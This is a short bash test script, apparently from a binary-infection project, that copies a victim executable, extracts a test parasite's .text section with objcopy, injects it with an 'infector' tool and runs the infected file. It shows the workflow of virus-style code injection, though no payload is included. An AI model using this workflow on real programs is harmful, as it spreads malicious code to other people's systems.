#!/bin/bash
set -e

function test_infection() {
    cp $1 infector/tmp_victim
    cp infector/test_parasite infector/tmp_test_parasite
    chmod 700 infector/tmp_victim
    chmod 700 infector/tmp_test_parasite

    objcopy --dump-section .text=infector/bin infector/tmp_test_parasite

    file_attr_pre_injection=$(ls -la infector/tmp_victim)

    infector/infector infector/tmp_victim infector/bin $2

    infector/tmp_victim
}